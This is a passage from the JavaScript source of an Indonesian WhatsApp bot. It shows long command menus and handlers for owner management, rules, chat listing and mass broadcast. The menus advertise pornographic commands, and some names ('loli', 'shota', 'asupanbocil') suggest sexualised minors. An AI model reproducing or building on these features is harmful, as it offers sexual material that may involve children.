│ ${ya}${Yy+=1} ${prefix}sound38${ya}
│ ${ya}${Yy+=1} ${prefix}sound39${ya}
│ ${ya}${Yy+=1} ${prefix}sound40${ya}
│ ${ya}${Yy+=1} ${prefix}sound41${ya}
│ ${ya}${Yy+=1} ${prefix}sound42${ya}
│ ${ya}${Yy+=1} ${prefix}sound43${ya}
│ ${ya}${Yy+=1} ${prefix}sound44${ya}
│ ${ya}${Yy+=1} ${prefix}sound45${ya}
│ ${ya}${Yy+=1} ${prefix}sound46${ya}
│ ${ya}${Yy+=1} ${prefix}sound47${ya}
│ ${ya}${Yy+=1} ${prefix}sound48${ya}
│ ${ya}${Yy+=1} ${prefix}sound49${ya}
│ ${ya}${Yy+=1} ${prefix}sound50${ya}
│ ${ya}${Yy+=1} ${prefix}sound51${ya}
│ ${ya}${Yy+=1} ${prefix}sound52${ya}
│ ${ya}${Yy+=1} ${prefix}sound53${ya}
│ ${ya}${Yy+=1} ${prefix}sound54${ya}
│ ${ya}${Yy+=1} ${prefix}sound55${ya}
│ ${ya}${Yy+=1} ${prefix}sound56${ya}
│ ${ya}${Yy+=1} ${prefix}sound57${ya}
│ ${ya}${Yy+=1} ${prefix}sound58${ya}
│ ${ya}${Yy+=1} ${prefix}sound59${ya}
│ ${ya}${Yy+=1} ${prefix}sound60${ya}
│ ${ya}${Yy+=1} ${prefix}sound61${ya}
│ ${ya}${Yy+=1} ${prefix}sound62${ya}
│ ${ya}${Yy+=1} ${prefix}sound63${ya}
│ ${ya}${Yy+=1} ${prefix}sound64${ya}
│ ${ya}${Yy+=1} ${prefix}sound65${ya}
│ ${ya}${Yy+=1} ${prefix}sound66${ya}
│ ${ya}${Yy+=1} ${prefix}sound67${ya}
│ ${ya}${Yy+=1} ${prefix}sound68${ya}
│ ${ya}${Yy+=1} ${prefix}sound69${ya}
│ ${ya}${Yy+=1} ${prefix}sound70${ya}
│ ${ya}${Yy+=1} ${prefix}sound71${ya}
│ ${ya}${Yy+=1} ${prefix}sound72${ya}
│ ${ya}${Yy+=1} ${prefix}sound73${ya}
│ ${ya}${Yy+=1} ${prefix}sound74${ya}
└──────
┌──『 ${ya}Logo Menu${ya} 』
│ ${ya}${Yy+=1} ${prefix}candy${ya}
│ ${ya}${Yy+=1} ${prefix}3dchristmas${ya}
│ ${ya}${Yy+=1} ${prefix}sparklechristmas${ya}
│ ${ya}${Yy+=1} ${prefix}deepsea${ya}
│ ${ya}${Yy+=1} ${prefix}scifi${ya}
│ ${ya}${Yy+=1} ${prefix}rainbow${ya}
│ ${ya}${Yy+=1} ${prefix}waterpipe${ya}
│ ${ya}${Yy+=1} ${prefix}spooky${ya} 
│ ${ya}${Yy+=1} ${prefix}pencil${ya}
│ ${ya}${Yy+=1} ${prefix}circuit${ya}
│ ${ya}${Yy+=1} ${prefix}discovery${ya}
│ ${ya}${Yy+=1} ${prefix}metalic${ya}
│ ${ya}${Yy+=1} ${prefix}fiction${ya}
│ ${ya}${Yy+=1} ${prefix}demon${ya} 
│ ${ya}${Yy+=1} ${prefix}transformer${ya}
│ ${ya}${Yy+=1} ${prefix}berry${ya}
│ ${ya}${Yy+=1} ${prefix}magma${ya}
│ ${ya}${Yy+=1} ${prefix}3dstone${ya} 
│ ${ya}${Yy+=1} ${prefix}brokenglass${ya}
│ ${ya}${Yy+=1} ${prefix}papercut${ya} 
│ ${ya}${Yy+=1} ${prefix}graffitibike${ya}
│ ${ya}${Yy+=1} ${prefix}honey${ya}
│ ${ya}${Yy+=1} ${prefix}ice${ya}
│ ${ya}${Yy+=1} ${prefix}fruitjuice${ya}
│ ${ya}${Yy+=1} ${prefix}biscuit${ya}
│ ${ya}${Yy+=1} ${prefix}wood${ya} 
│ ${ya}${Yy+=1} ${prefix}chocolate${ya}
│ ${ya}${Yy+=1} ${prefix}matrix${ya}
│ ${ya}${Yy+=1} ${prefix}blood${ya}
│ ${ya}${Yy+=1} ${prefix}dropwater${ya}
│ ${ya}${Yy+=1} ${prefix}lava${ya}
│ ${ya}${Yy+=1} ${prefix}rock${ya}
│ ${ya}${Yy+=1} ${prefix}bloodglas${ya}
│ ${ya}${Yy+=1} ${prefix}hallowen${ya}
│ ${ya}${Yy+=1} ${prefix}darkgold${ya}
│ ${ya}${Yy+=1} ${prefix}joker${ya}
│ ${ya}${Yy+=1} ${prefix}wicker${ya}
│ ${ya}${Yy+=1} ${prefix}firework${ya}
│ ${ya}${Yy+=1} ${prefix}skeleton${ya}
│ ${ya}${Yy+=1} ${prefix}sand${ya}
│ ${ya}${Yy+=1} ${prefix}glue${ya}
│ ${ya}${Yy+=1} ${prefix}1917${ya}
│ ${ya}${Yy+=1} ${prefix}leaves${ya} 
│ ${ya}${Yy+=1} ${prefix}tololserti${ya}
│ ${ya}${Yy+=1} ${prefix}shadow${ya}
│ ${ya}${Yy+=1} ${prefix}cup${ya}
│ ${ya}${Yy+=1} ${prefix}cup1${ya}
│ ${ya}${Yy+=1} ${prefix}romance${ya}
│ ${ya}${Yy+=1} ${prefix}smoke${ya}
│ ${ya}${Yy+=1} ${prefix}burnpaper${ya}
│ ${ya}${Yy+=1} ${prefix}lovemessage${ya}
│ ${ya}${Yy+=1} ${prefix}undergrass${ya}
│ ${ya}${Yy+=1} ${prefix}love${ya}
│ ${ya}${Yy+=1} ${prefix}coffe${ya}
│ ${ya}${Yy+=1} ${prefix}woodheart${ya}
│ ${ya}${Yy+=1} ${prefix}woodenboard${ya}
│ ${ya}${Yy+=1} ${prefix}summer3d${ya}
│ ${ya}${Yy+=1} ${prefix}wolfmetal${ya}
│ ${ya}${Yy+=1} ${prefix}nature3d${ya}
│ ${ya}${Yy+=1} ${prefix}underwater${ya}
│ ${ya}${Yy+=1} ${prefix}golderrose${ya}
│ ${ya}${Yy+=1} ${prefix}summernature${ya}
│ ${ya}${Yy+=1} ${prefix}letterleaves${ya}
│ ${ya}${Yy+=1} ${prefix}glowingneon${ya}
│ ${ya}${Yy+=1} ${prefix}fallleaves${ya}
│ ${ya}${Yy+=1} ${prefix}flamming${ya}
│ ${ya}${Yy+=1} ${prefix}harrypotter${ya}
│ ${ya}${Yy+=1} ${prefix}carvedwood${ya}
│ ${ya}${Yy+=1} ${prefix}tiktokmaker${ya}
│ ${ya}${Yy+=1} ${prefix}ktpmaker${ya}
│ ${ya}${Yy+=1} ${prefix}arcade8bit${ya}
│ ${ya}${Yy+=1} ${prefix}battlefield4${ya}
│ ${ya}${Yy+=1} ${prefix}pubg${ya}
│ ${ya}${Yy+=1} ${prefix}pornhub${ya}
│ ${ya}${Yy+=1} ${prefix}glitch${ya}
│ ${ya}${Yy+=1} ${prefix}avenger${ya}
│ ${ya}${Yy+=1} ${prefix}space${ya}
│ ${ya}${Yy+=1} ${prefix}ninjalogo${ya}
│ ${ya}${Yy+=1} ${prefix}marvelstudio${ya}
│ ${ya}${Yy+=1} ${prefix}lionlogo${ya}
│ ${ya}${Yy+=1} ${prefix}wolflogo${ya}
│ ${ya}${Yy+=1} ${prefix}steel3d${ya}
│ ${ya}${Yy+=1} ${prefix}wallgravity${ya}
│ ${ya}${Yy+=1} ${prefix}coolgravity${ya}
│ ${ya}${Yy+=1} ${prefix}wetglass${ya}
│ ${ya}${Yy+=1} ${prefix}multicolor3d${ya}
│ ${ya}${Yy+=1} ${prefix}watercolor${ya}
│ ${ya}${Yy+=1} ${prefix}luxurygold${ya}
│ ${ya}${Yy+=1} ${prefix}galaxywallpaper${ya}
│ ${ya}${Yy+=1} ${prefix}lighttext${ya}
│ ${ya}${Yy+=1} ${prefix}beautifulflower${ya}
│ ${ya}${Yy+=1} ${prefix}puppycute${ya}
│ ${ya}${Yy+=1} ${prefix}royaltext${ya}
│ ${ya}${Yy+=1} ${prefix}heartshaped${ya}
│ ${ya}${Yy+=1} ${prefix}birthdaycake${ya}
│ ${ya}${Yy+=1} ${prefix}galaxystyle${ya}
│ ${ya}${Yy+=1} ${prefix}hologram3d${ya}
│ ${ya}${Yy+=1} ${prefix}greenneon${ya}
│ ${ya}${Yy+=1} ${prefix}glossychrome${ya}
│ ${ya}${Yy+=1} ${prefix}greenbush${ya}
│ ${ya}${Yy+=1} ${prefix}metallogo${ya}
│ ${ya}${Yy+=1} ${prefix}noeltext${ya}
│ ${ya}${Yy+=1} ${prefix}glittergold${ya}
│ ${ya}${Yy+=1} ${prefix}textcake${ya}
│ ${ya}${Yy+=1} ${prefix}starsnight${ya}
│ ${ya}${Yy+=1} ${prefix}wooden3d${ya}
│ ${ya}${Yy+=1} ${prefix}textbyname${ya}
│ ${ya}${Yy+=1} ${prefix}writegalacy${ya}
│ ${ya}${Yy+=1} ${prefix}galaxybat${ya}
│ ${ya}${Yy+=1} ${prefix}snow3d${ya}
│ ${ya}${Yy+=1} ${prefix}birthdayday${ya}
│ ${ya}${Yy+=1} ${prefix}goldplaybutton${ya}
│ ${ya}${Yy+=1} ${prefix}silverplaybutton${ya}
│ ${ya}${Yy+=1} ${prefix}freefire${ya}
│ ${ya}${Yy+=1} ${prefix}blackpink${ya}
│ ${ya}${Yy+=1} ${prefix}neon${ya}
│ ${ya}${Yy+=1} ${prefix}greenneon${ya}
│ ${ya}${Yy+=1} ${prefix}advanceglow${ya}
│ ${ya}${Yy+=1} ${prefix}futureneon${ya}
│ ${ya}${Yy+=1} ${prefix}sandwriting${ya}
│ ${ya}${Yy+=1} ${prefix}sandsummer${ya}
│ ${ya}${Yy+=1} ${prefix}sandengraved${ya}
│ ${ya}${Yy+=1} ${prefix}metaldark${ya}
│ ${ya}${Yy+=1} ${prefix}neonlight${ya}
│ ${ya}${Yy+=1} ${prefix}holographic${ya}
│ ${ya}${Yy+=1} ${prefix}text1917${ya}
│ ${ya}${Yy+=1} ${prefix}minion${ya}
│ ${ya}${Yy+=1} ${prefix}deluxesilver${ya}
│ ${ya}${Yy+=1} ${prefix}newyearcard${ya}
│ ${ya}${Yy+=1} ${prefix}bloodfrosted${ya}
│ ${ya}${Yy+=1} ${prefix}halloween${ya}
│ ${ya}${Yy+=1} ${prefix}jokerlogo${ya}
│ ${ya}${Yy+=1} ${prefix}fireworksparkle${ya}
│ ${ya}${Yy+=1} ${prefix}natureleaves${ya}
│ ${ya}${Yy+=1} ${prefix}bokeh${ya}
│ ${ya}${Yy+=1} ${prefix}toxic${ya}
│ ${ya}${Yy+=1} ${prefix}strawberry${ya}
│ ${ya}${Yy+=1} ${prefix}box3d${ya}
│ ${ya}${Yy+=1} ${prefix}roadwarning${ya}
│ ${ya}${Yy+=1} ${prefix}breakwall${ya}
│ ${ya}${Yy+=1} ${prefix}icecold${ya}
│ ${ya}${Yy+=1} ${prefix}luxury${ya}
│ ${ya}${Yy+=1} ${prefix}cloud${ya}
│ ${ya}${Yy+=1} ${prefix}summersand${ya}
│ ${ya}${Yy+=1} ${prefix}horrorblood${ya}
│ ${ya}${Yy+=1} ${prefix}thunder${ya}
└──────
┌──『 ${ya}Photo Funia${ya} 』
│ ${ya}${Yy+=1} ${prefix}denimembroidery${ya}
│ ${ya}${Yy+=1} ${prefix}bracelet${ya}
│ ${ya}${Yy+=1} ${prefix}nightmare${ya}
│ ${ya}${Yy+=1} ${prefix}neondevil${ya}
│ ${ya}${Yy+=1} ${prefix}artpapercut${ya}
│ ${ya}${Yy+=1} ${prefix}neonwriting${ya}
│ ${ya}${Yy+=1} ${prefix}airballoon${ya}
│ ${ya}${Yy+=1} ${prefix}lovelock${ya}
│ ${ya}${Yy+=1} ${prefix}neonsign${ya}
│ ${ya}${Yy+=1} ${prefix}christmas${ya}
│ ${ya}${Yy+=1} ${prefix}cemeterygates${ya}
└──────
┌──『 ${ya}Random Foto${ya} 』
│ ${ya}${Yy+=1} ${prefix}hentai${ya}
│ ${ya}${Yy+=1} ${prefix}ahegao${ya}
│ ${ya}${Yy+=1} ${prefix}ass${ya}
│ ${ya}${Yy+=1} ${prefix}bdsm${ya}
│ ${ya}${Yy+=1} ${prefix}cuckold${ya}
│ ${ya}${Yy+=1} ${prefix}cum${ya}
│ ${ya}${Yy+=1} ${prefix}ero${ya}
│ ${ya}${Yy+=1} ${prefix}femdom${ya}
│ ${ya}${Yy+=1} ${prefix}foot${ya}
│ ${ya}${Yy+=1} ${prefix}gangbang${ya}
│ ${ya}${Yy+=1} ${prefix}glasses${ya}
│ ${ya}${Yy+=1} ${prefix}jahy${ya}
│ ${ya}${Yy+=1} ${prefix}masturbation${ya}
│ ${ya}${Yy+=1} ${prefix}orgy${ya}
│ ${ya}${Yy+=1} ${prefix}panties${ya}
│ ${ya}${Yy+=1} ${prefix}pussy${ya}
│ ${ya}${Yy+=1} ${prefix}thighs${ya}
│ ${ya}${Yy+=1} ${prefix}yuri${ya}
│ ${ya}${Yy+=1} ${prefix}wallpaper${ya}
│ ${ya}${Yy+=1} ${prefix}wallpapermeme${ya}
│ ${ya}${Yy+=1} ${prefix}wallpaperprogamer${ya}
│ ${ya}${Yy+=1} ${prefix}wallpapergamer${ya}
│ ${ya}${Yy+=1} ${prefix}wallpaperanime${ya}
│ ${ya}${Yy+=1} ${prefix}wallpaperteknologi${ya}
│ ${ya}${Yy+=1} ${prefix}wallpapercyber${ya}
│ ${ya}${Yy+=1} ${prefix}wallpaperinori${ya}
│ ${ya}${Yy+=1} ${prefix}wallpaperislami${ya}
│ ${ya}${Yy+=1} ${prefix}darkjokes${ya}
│ ${ya}${Yy+=1} ${prefix}meme${ya}
│ ${ya}${Yy+=1} ${prefix}hsdxd${ya}
│ ${ya}${Yy+=1} ${prefix}sao${ya}
│ ${ya}${Yy+=1} ${prefix}lovelive${ya}
│ ${ya}${Yy+=1} ${prefix}translate${ya}
│ ${ya}${Yy+=1} ${prefix}pinterest${ya}
│ ${ya}${Yy+=1} ${prefix}ppcouple${ya}
│ ${ya}${Yy+=1} ${prefix}hijaber${ya}
│ ${ya}${Yy+=1} ${prefix}cecan${ya}
│ ${ya}${Yy+=1} ${prefix}cecan2${ya}
│ ${ya}${Yy+=1} ${prefix}cogan${ya}
│ ${ya}${Yy+=1} ${prefix}waifu${ya}
│ ${ya}${Yy+=1} ${prefix}loli${ya}
│ ${ya}${Yy+=1} ${prefix}husbu${ya}
│ ${ya}${Yy+=1} ${prefix}milf${ya}
│ ${ya}${Yy+=1} ${prefix}cosplay${ya}
│ ${ya}${Yy+=1} ${prefix}wallml${ya}
│ ${ya}${Yy+=1} ${prefix}art${ya}
│ ${ya}${Yy+=1} ${prefix}bts${ya}
│ ${ya}${Yy+=1} ${prefix}exo${ya}
│ ${ya}${Yy+=1} ${prefix}elf${ya}
│ ${ya}${Yy+=1} ${prefix}neko${ya}
│ ${ya}${Yy+=1} ${prefix}shota${ya}
│ ${ya}${Yy+=1} ${prefix}sagiri${ya}
│ ${ya}${Yy+=1} ${prefix}shinobu${ya}
│ ${ya}${Yy+=1} ${prefix}megumin${ya}
│ ${ya}${Yy+=1} ${prefix}wallnime${ya}
│ ${ya}${Yy+=1} ${prefix}chiisaihentai${ya}
│ ${ya}${Yy+=1} ${prefix}trap${ya}
│ ${ya}${Yy+=1} ${prefix}blowjob${ya}
│ ${ya}${Yy+=1} ${prefix}yaoi${ya}
│ ${ya}${Yy+=1} ${prefix}ecchi${ya}
│ ${ya}${Yy+=1} ${prefix}ahegao2${ya}
│ ${ya}${Yy+=1} ${prefix}hololewd${ya}
│ ${ya}${Yy+=1} ${prefix}sideoppai${ya}
│ ${ya}${Yy+=1} ${prefix}animefeets${ya}
│ ${ya}${Yy+=1} ${prefix}animebooty${ya}
│ ${ya}${Yy+=1} ${prefix}animethighss${ya}
│ ${ya}${Yy+=1} ${prefix}hentaiparadise${ya}
│ ${ya}${Yy+=1} ${prefix}animearmpits${ya}
│ ${ya}${Yy+=1} ${prefix}hentaifemdom${ya}
│ ${ya}${Yy+=1} ${prefix}lewdanimegirls${ya}
│ ${ya}${Yy+=1} ${prefix}biganimetiddies${ya}
│ ${ya}${Yy+=1} ${prefix}animebellybutton${ya}
│ ${ya}${Yy+=1} ${prefix}hentai4everyone${ya}
│ ${ya}${Yy+=1} ${prefix}exo${ya} 
│ ${ya}${Yy+=1} ${prefix}islamic${ya} 
│ ${ya}${Yy+=1} ${prefix}aesthetic${ya} 
│ ${ya}${Yy+=1} ${prefix}akira${ya} 
│ ${ya}${Yy+=1} ${prefix}akiyama${ya} 
│ ${ya}${Yy+=1} ${prefix}ana${ya} 
│ ${ya}${Yy+=1} ${prefix}anjing${ya} 
│ ${ya}${Yy+=1} ${prefix}art2${ya} 
│ ${ya}${Yy+=1} ${prefix}asuna${ya} 
│ ${ya}${Yy+=1} ${prefix}ayuzawa${ya} 
│ ${ya}${Yy+=1} ${prefix}randblackpink${ya} 
│ ${ya}${Yy+=1} ${prefix}boneka${ya} 
│ ${ya}${Yy+=1} ${prefix}boruto${ya} 
│ ${ya}${Yy+=1} ${prefix}cecan2${ya} 
│ ${ya}${Yy+=1} ${prefix}chiho${ya} 
│ ${ya}${Yy+=1} ${prefix}chitoge${ya} 
│ ${ya}${Yy+=1} ${prefix}cogan2${ya} 
│ ${ya}${Yy+=1} ${prefix}cosplay${ya} 
│ ${ya}${Yy+=1} ${prefix}cosplayloli${ya} 
│ ${ya}${Yy+=1} ${prefix}cosplaysagiri${ya} 
│ ${ya}${Yy+=1} ${prefix}cuckold${ya} 
│ ${ya}${Yy+=1} ${prefix}cum${ya} 
│ ${ya}${Yy+=1} ${prefix}cyber${ya} 
│ ${ya}${Yy+=1} ${prefix}darkjokes${ya} 
│ ${ya}${Yy+=1} ${prefix}deidara${ya} 
│ ${ya}${Yy+=1} ${prefix}doraemon${ya} 
│ ${ya}${Yy+=1} ${prefix}eba${ya} 
│ ${ya}${Yy+=1} ${prefix}elaina${ya} 
│ ${ya}${Yy+=1} ${prefix}emilia${ya} 
│ ${ya}${Yy+=1} ${prefix}ero${ya} 
│ ${ya}${Yy+=1} ${prefix}erza${ya} 
│ ${ya}${Yy+=1} ${prefix}femdom${ya} 
│ ${ya}${Yy+=1} ${prefix}foot${ya} 
│ ${ya}${Yy+=1} ${prefix}freefire2${ya} 
│ ${ya}${Yy+=1} ${prefix}gamewallpaper${ya} 
│ ${ya}${Yy+=1} ${prefix}gangbang${ya} 
│ ${ya}${Yy+=1} ${prefix}gifs${ya} 
│ ${ya}${Yy+=1} ${prefix}glasses${ya} 
│ ${ya}${Yy+=1} ${prefix}gremory${ya} 
│ ${ya}${Yy+=1} ${prefix}hekel${ya} 
│ ${ya}${Yy+=1} ${prefix}hentai${ya} 
│ ${ya}${Yy+=1} ${prefix}hestia${ya} 
│ ${ya}${Yy+=1} ${prefix}hijaber${ya} 
│ ${ya}${Yy+=1} ${prefix}hinata${ya} 
│ ${ya}${Yy+=1} ${prefix}husbu${ya} 
│ ${ya}${Yy+=1} ${prefix}inori${ya} 
│ ${ya}${Yy+=1} ${prefix}isuzu${ya} 
│ ${ya}${Yy+=1} ${prefix}itachi${ya} 
│ ${ya}${Yy+=1} ${prefix}itori${ya} 
│ ${ya}${Yy+=1} ${prefix}jahy${ya} 
│ ${ya}${Yy+=1} ${prefix}jeni${ya} 
│ ${ya}${Yy+=1} ${prefix}jiso${ya} 
│ ${ya}${Yy+=1} ${prefix}justina${ya} 
│ ${ya}${Yy+=1} ${prefix}kaga${ya} 
│ ${ya}${Yy+=1} ${prefix}kagura${ya} 
│ ${ya}${Yy+=1} ${prefix}kakasih${ya} 
│ ${ya}${Yy+=1} ${prefix}kaori${ya} 
│ ${ya}${Yy+=1} ${prefix}kartun${ya} 
│ ${ya}${Yy+=1} ${prefix}katakata${ya} 
│ ${ya}${Yy+=1} ${prefix}keneki${ya} 
│ ${ya}${Yy+=1} ${prefix}kotori${ya} 
│ ${ya}${Yy+=1} ${prefix}kpop${ya} 
│ ${ya}${Yy+=1} ${prefix}kucing${ya} 
│ ${ya}${Yy+=1} ${prefix}kurumi${ya} 
│ ${ya}${Yy+=1} ${prefix}lisa${ya} 
│ ${ya}${Yy+=1} ${prefix}madara${ya} 
│ ${ya}${Yy+=1} ${prefix}masturbation${ya} 
│ ${ya}${Yy+=1} ${prefix}megumin${ya} 
│ ${ya}${Yy+=1} ${prefix}mikasa${ya} 
│ ${ya}${Yy+=1} ${prefix}mikey${ya} 
│ ${ya}${Yy+=1} ${prefix}miku${ya} 
│ ${ya}${Yy+=1} ${prefix}milf${ya} 
│ ${ya}${Yy+=1} ${prefix}minato${ya} 
│ ${ya}${Yy+=1} ${prefix}mobil${ya} 
│ ${ya}${Yy+=1} ${prefix}motor${ya} 
│ ${ya}${Yy+=1} ${prefix}mountain${ya} 
│ ${ya}${Yy+=1} ${prefix}naruto${ya} 
│ ${ya}${Yy+=1} ${prefix}neko1${ya} 
│ ${ya}${Yy+=1} ${prefix}neko2${ya} 
│ ${ya}${Yy+=1} ${prefix}nekonime${ya} 
│ ${ya}${Yy+=1} ${prefix}nezuko${ya} 
│ ${ya}${Yy+=1} ${prefix}onepiece${ya} 
│ ${ya}${Yy+=1} ${prefix}orgy${ya} 
│ ${ya}${Yy+=1} ${prefix}panties${ya} 
│ ${ya}${Yy+=1} ${prefix}pentol${ya} 
│ ${ya}${Yy+=1} ${prefix}pokemon${ya} 
│ ${ya}${Yy+=1} ${prefix}profil${ya} 
│ ${ya}${Yy+=1} ${prefix}programming${ya} 
│ ${ya}${Yy+=1} ${prefix}pubg${ya} 
│ ${ya}${Yy+=1} ${prefix}pussy${ya} 
│ ${ya}${Yy+=1} ${prefix}rize${ya} 
│ ${ya}${Yy+=1} ${prefix}rose${ya} 
│ ${ya}${Yy+=1} ${prefix}ryujin${ya} 
│ ${ya}${Yy+=1} ${prefix}sagiri${ya} 
│ ${ya}${Yy+=1} ${prefix}sakura${ya} 
│ ${ya}${Yy+=1} ${prefix}sasuke${ya} 
│ ${ya}${Yy+=1} ${prefix}satanic${ya} 
│ ${ya}${Yy+=1} ${prefix}shina${ya} 
│ ${ya}${Yy+=1} ${prefix}shinka${ya} 
│ ${ya}${Yy+=1} ${prefix}shinomiya${ya} 
│ ${ya}${Yy+=1} ${prefix}shizuka${ya} 
│ ${ya}${Yy+=1} ${prefix}shota${ya} 
│ ${ya}${Yy+=1} ${prefix}tatasurya${ya} 
│ ${ya}${Yy+=1} ${prefix}technology${ya} 
│ ${ya}${Yy+=1} ${prefix}tejina${ya} 
│ ${ya}${Yy+=1} ${prefix}tentacles${ya} 
│ ${ya}${Yy+=1} ${prefix}thighs${ya} 
│ ${ya}${Yy+=1} ${prefix}toukachan${ya} 
│ ${ya}${Yy+=1} ${prefix}tsunade${ya} 
│ ${ya}${Yy+=1} ${prefix}waifu2${ya} 
│ ${ya}${Yy+=1} ${prefix}wallhp${ya} 
│ ${ya}${Yy+=1} ${prefix}wallml${ya} 
│ ${ya}${Yy+=1} ${prefix}wallnime2${ya} 
│ ${ya}${Yy+=1} ${prefix}yotsuba${ya} 
│ ${ya}${Yy+=1} ${prefix}yuki${ya} 
│ ${ya}${Yy+=1} ${prefix}yulibocil${ya} 
│ ${ya}${Yy+=1} ${prefix}yumeko${ya} 
│ ${ya}${Yy+=1} ${prefix}randomnime${ya}
│ ${ya}${Yy+=1} ${prefix}randomnime2${ya}
└──────
┌──『 ${ya}Random Video${ya} 』
│ ${ya}${Yy+=1} ${prefix}storyanime${ya}
│ ${ya}${Yy+=1} ${prefix}asupan${ya}
│ ${ya}${Yy+=1} ${prefix}asupansantuy${ya} 
│ ${ya}${Yy+=1} ${prefix}asupanbocil${ya}
│ ${ya}${Yy+=1} ${prefix}asupanukhty${ya}
│ ${ya}${Yy+=1} ${prefix}asupanghea${ya}
│ ${ya}${Yy+=1} ${prefix}asupanrikagusriani${ya}
│ ${ya}${Yy+=1} ${prefix}asupan2${ya}
│ ${ya}${Yy+=1} ${prefix}bokep${ya}
│ ${ya}${Yy+=1} ${prefix}bocil${ya}
│ ${ya}${Yy+=1} ${prefix}santuy${ya}
│ ${ya}${Yy+=1} ${prefix}ukhty${ya}
│ ${ya}${Yy+=1} ${prefix}rikagusriani${ya}
│ ${ya}${Yy+=1} ${prefix}ghea${ya}
└──────`)}
break
case 'addowner':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isCreator) return reply(mess.owner)
if (!args[0]) return reply(`Contoh ${prefix+command} 628×××××`)
bnnd = `${args[0].replace('@', '')}`
owner.push(bnnd)
fs.writeFileSync('./Database/owner.json', JSON.stringify(owner))
reply(`Nomor ${bnnd} Telah Menjadi Owner!!!`)
break
case 'delowner':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isCreator) return reply(mess.owner)
if (!args[0]) return reply(`Contoh ${prefix+command} 628×××××`)
ya = `${args[0].replace('@', '')}`
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./Database/owner.json', JSON.stringify(owner))
reply(`Nomor ${ya} Telah Di Hapus Owner!!!`)
break
case 'tes':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
let btn = [{
urlButton: {
displayText: 'Group Bot',
url: `${gckirbotz}`
}
}
,
{
quickReplyButton: {
displayText: 'M E N U',
id: `${prefix}menu`
}
}]
kirbotz.send5Loc(m.chat, `On Kak Silahkan Pencet Button Di Bawah\nJika Button Tidak Kelihatan Ketik ${prefix}menu`, `Created By BloodSword`, global.thumb, btn)
}
break
case 'userkirbotz':{
replyNya(`*${Object.keys(global.db.data.users).length} User*`)
}
break
case 'rules': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
ules = `${ucapanWaktu} 𝐊𝐚𝐤 *${pushname}*
𒍮 𝙍𝙪𝙡𝙚𝙨 𝘽𝙤𝙩𝙯
❒͡ 1. 𝑱𝒂𝒏𝒈𝒂𝒏 𝑺𝒑𝒂𝒎 𝑩𝒐𝒕𝒛
      *sᴀɴᴋsɪ : ᴡᴀʀɴ/sᴏғᴛ ʙʟᴏᴄᴋ*
❒͡ 2. 𝑱𝒂𝒏𝒈𝒂𝒏 𝑻𝒆𝒍𝒆𝒑𝒐𝒏 𝑩𝒐𝒕𝒛
      *sᴀɴᴋsɪ : sᴏғᴛ ʙʟᴏᴄᴋ*
❒͡ 3. 𝑱𝒂𝒏𝒈𝒂𝒏 𝑩𝒂𝒏𝒅𝒊𝒏𝒈 𝑩𝒐𝒕𝒛
      *sᴀɴᴋsɪ : ʙʟᴏᴄᴋ ᴘᴇʀᴍᴀɴᴇɴ*

𒍮 𝑶𝒘𝒏𝒆𝒓 𝑩𝒐𝒕𝒛 ↓↓
_*https://wa.me/62881036690566*_`
let message = await prepareWAMessageMedia({ image: fs.readFileSync('./Image/kirbotz.jpg') }, { upload: kirbotz.waUploadToServer })
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
hydratedTemplate: {
imageMessage: message.imageMessage,
hydratedContentText: ules,
hydratedFooterText: 'Jika Kamu Menemukan Semacam Bug Atau Kesalahan Mohon Dimaklumi Dulu Yaa, Lapor Owner Jika Perlu Atau Mendesak 🙏',
hydratedButtons: [{
urlButton: {
displayText: 'Owner Bot',
url: `${wame}`
}
},
{
urlButton: {
displayText: 'Script Bot',
url: `https://youtube.com/channel/UC7NslQroUqQYzo2wDFBOUMg`
}
}]
}
}
}), { userJid: m.chat, quoted: m })
kirbotz.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
case 'listpc': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
            	if (!m.key.fromMe && !isCreator) return replyNya(mess.owner)
                 let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
                 let teks = `⬣ *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`
                 for (let i of anu) {
                     let nama = store.messages[i].array[0].pushName
                     teks += `⬡ *Nama :* ${nama}\n⬡ *User :* @${i.split('@')[0]}\n⬡ *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
                 }
                 kirbotz.sendTextWithMentions(m.chat, teks, m)
             }
             break
case 'bcimg': case 'bcvidio': case 'bcaudio': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isCreator) return replyNya(mess.owner)
if (!/video/.test(mime) && !/image/.test(mime) && !/audio/.test(mime)) return replyNya(`Kirim/Reply Video/Audio/Image Yang Ingin Di Broadcast Dengan Caption ${prefix + command}`)
let anu = await store.chats.all().map(v => v.id)
replyNya(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
for (let i of anu) {
await sleep(1500)
let butoon = [{
urlButton: {
displayText: `Owner Bot`,
url: `${wame}`
}
},
{
quickReplyButton: {
displayText: 'List Menu',
id: 'menu'
}
}]
let media = await kirbotz.downloadAndSaveMediaMessage(quoted)
let buffer = fs.readFileSync(media)
if (/webp/.test(mime)) {
kirbotz.sendMessage(i, { sticker: { url: media } }, { quoted: m })
} else if (/image/.test(mime)) {
let junn = `*_BROADCAST IMAGE_*${text ? '\n\n' + text : ''}`
kirbotz.send5ButImg(i, junn, `Created By BloodSword`, buffer, butoon)
} else if (/video/.test(mime)) {
let junn = `*_BROADCAST VIDIO_*${text ? '\n\n' + text : ''}`
kirbotz.send5Vid(i, junn, `Created By BloodSword`, buffer, butoon)
} else if (/audio/.test(mime)) {
kirbotz.sendMessage(i, {audio: buffer, mimetype: 'audio/mpeg'}, { quoted : m })
} else {
